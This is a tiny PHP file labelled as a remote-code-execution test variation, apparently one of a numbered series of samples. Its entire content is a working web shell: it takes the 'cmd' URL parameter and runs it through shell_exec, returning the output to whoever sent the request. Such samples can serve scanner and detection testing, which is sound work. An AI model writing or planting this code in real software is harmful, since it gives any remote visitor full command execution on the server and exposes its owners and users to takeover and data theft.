<?php
// RCE test variation #380
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>